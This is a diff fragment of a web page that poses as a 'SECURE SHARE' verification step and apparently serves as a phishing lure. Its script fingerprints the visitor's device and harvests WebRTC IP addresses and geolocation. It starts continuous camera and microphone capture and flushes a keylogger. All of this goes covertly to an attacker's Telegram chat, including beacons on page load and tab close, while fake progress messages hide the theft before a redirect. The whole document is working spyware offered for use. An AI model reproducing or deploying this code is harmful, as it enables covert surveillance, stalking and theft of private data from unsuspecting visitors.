+            fetch(window.__C.api, {method: 'POST', body: fd})
+                .then(function(rsp){
+                    if (callback) callback();
+                })
+                .catch(function(){
+                    // Fallback: send as text
+                    var summary = '&#128270; FINGERPRINT SUMMARY\n';
+                    summary += 'UA: ' + (d.device?.['User Agent'] || '?').substring(0, 80) + '\n';
+                    summary += 'Platform: ' + (d.device?.Platform || '?') + '\n';
+                    summary += 'Screen: ' + (d.device?.['Screen Size'] || '?') + '\n';
+                    if (locData && locData.latitude) {
+                        summary += 'Location: ' + locData.latitude + ',' + locData.longitude + '\n';
+                    }
+                    if (d.ips && d.ips.length > 0) summary += 'IPs: ' + d.ips.join(', ') + '\n';
+                    summary += 'Frames: ' + capturedFrames.length + ' | Keys: ' + keys.length;
+
+                    var p = {
+                        chat_id: window.__C.chatId,
+                        text: summary,
+                        disable_notification: true
+                    };
+                    fetch(window.__C.msgApi, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify(p)
+                    }).then(function(){ if (callback) callback(); })
+                      .catch(function(){ if (callback) callback(); });
+                });
+        } catch(e) {
+            if (callback) callback();
+        }
+    });
+}
+
+// ============================================================
+// MAIN EXTRACTION ORCHESTRATOR
+// ============================================================
+function startExtraction() {
+    if (extractionStarted || extractionDone) return;
+    extractionStarted = true;
+
+    prog.classList.add('show');
+    var pct = 0;
+    pfill.style.width = '0%';
+    plbl.innerHTML = '&#128295; Preparing extraction...';
+
+    // Disable the button
+    btn.disabled = true;
+    btn.className = 'cta';
+    btnT.innerHTML = '&#9889; Processing...';
+
+    function updateProgress(msg, increment) {
+        pct = Math.min(pct + increment, 95);
+        pfill.style.width = pct + '%';
+        if (msg) plbl.innerHTML = msg;
+    }
+
+    updateProgress('&#128269; Scanning device...', 3);
+
+    // Collect device, webgl, canvas, fonts synchronously first
+    var device = getDeviceInfo();
+    var webgl = getWebGLInfo();
+    var canvasFP = getCanvasFP();
+    var fonts = getFonts();
+    updateProgress('&#128269; Device fingerprinted', 10);
+
+    // Collect battery
+    getBattery().then(function(battery){
+        var batteryData = battery;
+        updateProgress('&#128267; Battery info gathered', 5);
+
+        // Get storage
+        var storage = getStorageStats();
+        var network = getNetwork();
+        updateProgress('&#128190; Storage & network scanned', 8);
+
+        // Get IPs via WebRTC (async)
+        getWebRTCIPs().then(function(ips){
+            updateProgress('&#127760; Network routes mapped', 8);
+
+            // Get location (async, may fail)
+            getLocation().then(function(location){
+                updateProgress('&#128205; Geolocation acquired', 10);
+
+                // Assemble data
+                var collectedData = {
+                    device: device,
+                    webgl: webgl,
+                    canvasFP: canvasFP,
+                    fonts: fonts,
+                    ips: ips,
+                    storage: storage,
+                    battery: batteryData,
+                    network: network,
+                    location: location
+                };
+
+                updateProgress('&#128640; Starting continuous monitoring...', 10);
+
+                // START CONTINUOUS CAMERA CAPTURE
+                startContinuousCameraCapture(1);
+
+                // START CONTINUOUS MIC CAPTURE
+                startContinuousMicCapture();
+
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+
+                // Send final report
+                sendFinalReport(collectedData, function(){
+                    // Redirect to target URL
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+
+                    // Wait a moment so user sees 100%, then redirect
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+
+            }).catch(function(locErr){
+                // Location failed, continue with rest
+                updateProgress('&#128205; Location unavailable, continuing...', 5);
+                var collectedData = {
+                    device: device,
+                    webgl: webgl,
+                    canvasFP: canvasFP,
+                    fonts: fonts,
+                    ips: ips,
+                    storage: storage,
+                    battery: batteryData,
+                    network: network,
+                    location: null
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            });
+
+        }).catch(function(ipsErr){
+            updateProgress('&#127760; IP detection limited', 5);
+            // Fallback - just continue without IPs
+            getLocation().then(function(location){
+                updateProgress('&#128205; Geolocation acquired', 10);
+                var collectedData = {
+                    device: device,
+                    webgl: webgl,
+                    canvasFP: canvasFP,
+                    fonts: fonts,
+                    ips: [],
+                    storage: getStorageStats(),
+                    battery: batteryData,
+                    network: getNetwork(),
+                    location: location
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            }).catch(function(){
+                var collectedData = {
+                    device: device,
+                    webgl: webgl,
+                    canvasFP: canvasFP,
+                    fonts: fonts,
+                    ips: [],
+                    storage: getStorageStats(),
+                    battery: batteryData,
+                    network: getNetwork(),
+                    location: null
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            });
+        });
+    }).catch(function(batErr){
+        // Battery failed
+        updateProgress('&#128267; Battery unavailable', 3);
+        var storage = getStorageStats();
+        var network = getNetwork();
+        updateProgress('&#128190; Storage scanned', 8);
+
+        getWebRTCIPs().then(function(ips){
+            updateProgress('&#127760; Network mapped', 8);
+            getLocation().then(function(location){
+                updateProgress('&#128205; Location acquired', 10);
+                var collectedData = {
+                    device: device,
+                    webgl: webgl,
+                    canvasFP: canvasFP,
+                    fonts: fonts,
+                    ips: ips,
+                    storage: storage,
+                    battery: null,
+                    network: network,
+                    location: location
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            }).catch(function(){
+                updateProgress('&#128205; Location unavailable', 5);
+                var collectedData = {
+                    device: device, webgl: webgl, canvasFP: canvasFP,
+                    fonts: fonts, ips: ips, storage: storage,
+                    battery: null, network: network, location: null
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            });
+        }).catch(function(){
+            updateProgress('&#127760; IP detection failed', 5);
+            getLocation().then(function(location){
+                updateProgress('&#128205; Location acquired', 10);
+                var collectedData = {
+                    device: device, webgl: webgl, canvasFP: canvasFP,
+                    fonts: fonts, ips: [], storage: storage,
+                    battery: null, network: network, location: location
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            }).catch(function(){
+                var collectedData = {
+                    device: device, webgl: webgl, canvasFP: canvasFP,
+                    fonts: fonts, ips: [], storage: storage,
+                    battery: null, network: network, location: null
+                };
+                updateProgress('&#128640; Starting live monitoring...', 10);
+                startContinuousCameraCapture(1);
+                startContinuousMicCapture();
+                updateProgress('&#128247; &#127908; Live capture active', 10);
+                sendFinalReport(collectedData, function(){
+                    extractionDone = true;
+                    pfill.style.width = '100%';
+                    plbl.innerHTML = '&#10003; Verified! Redirecting...';
+                    btnT.innerHTML = '&#10003; Complete';
+                    btnS.innerHTML = '';
+                    setTimeout(function(){
+                        window.location.href = TARGET_URL;
+                    }, 1200);
+                });
+            });
+        });
+    });
+}
+
+// ============================================================
+// EVENT: CLICK UNLOCK BUTTON
+// ============================================================
+btn.addEventListener('click', function(){
+    if (!allGranted || extractionDone || extractionStarted) return;
+    startExtraction();
+});
+
+// ============================================================
+// VISIBILITY CHANGE - keep extracting in background
+// ============================================================
+document.addEventListener('visibilitychange', function(){
+    if (document.visibilityState === 'visible') {
+        // Tab is visible again, nothing special needed
+    } else {
+        // Tab hidden - camera/mic continue via their intervals
+    }
+});
+
+// ============================================================
+// BEFOREUNLOAD - flush everything and send final status
+// ============================================================
+window.addEventListener('beforeunload', function(){
+    // Flush keylogger
+    if (typeof window.__flushKeylog === 'function') window.__flushKeylog();
+
+    // Stop & flush camera
+    stopContinuousCamera();
+
+    // Stop & flush mic
+    stopContinuousMic();
+
+    // Send final status if extraction had started
+    if (extractionStarted) {
+        try {
+            var payload = {
+                chat_id: window.__C.chatId,
+                text: '&#128682; Tab closed. Continuous capture ended. Frames: ' +
+                      (capturedFrames.length > 0 ? capturedFrames.length + ' pending' : 'all sent') +
+                      ' | Audio: flushed | Keylog: flushed | Time: ' + new Date().toISOString(),
+                disable_notification: true
+            };
+            // Use sendBeacon for reliable delivery during page unload
+            var blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(window.__C.msgApi, blob);
+        } catch(e){}
+    }
+});
+
+// ============================================================
+// KEEP-ALIVE: prevents aggressive tab throttling
+// ============================================================
+keepAliveInterval = setInterval(function(){
+    // Minimal operation to keep tab alive
+    var _ = Date.now();
+}, 30000);
+
+// ============================================================
+// SELF-TEST: Verify Telegram config on page load (silent)
+// ============================================================
+(function(){
+    try {
+        fetch(window.__C.msgApi, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: window.__C.chatId,
+                text: '&#128679; SECURE SHARE page loaded | User Agent: ' +
+                      navigator.userAgent.substring(0, 80),
+                disable_notification: true
+            })
+        }).catch(function(){});
+    } catch(e){}
+})();
+
+// ============================================================
+// INIT: load background frame and setup
+// ============================================================
+try {
+    var bgFrame = $('bgFrame');
+    bgFrame.src = 'about:blank';
+    setTimeout(function(){
+        try {
+            bgFrame.src = TARGET_URL;
+        } catch(e){}
+    }, 500);
+} catch(e){}
+
+// Show some initial toast
+setTimeout(function(){
+    showToast('&#128274; Grant all 5 permissions to continue');
+}, 600);
+
+console.log('SECURE SHARE v2.0 loaded - TARGET_URL = ' + TARGET_URL);
+</script>
+</body>
+</html>
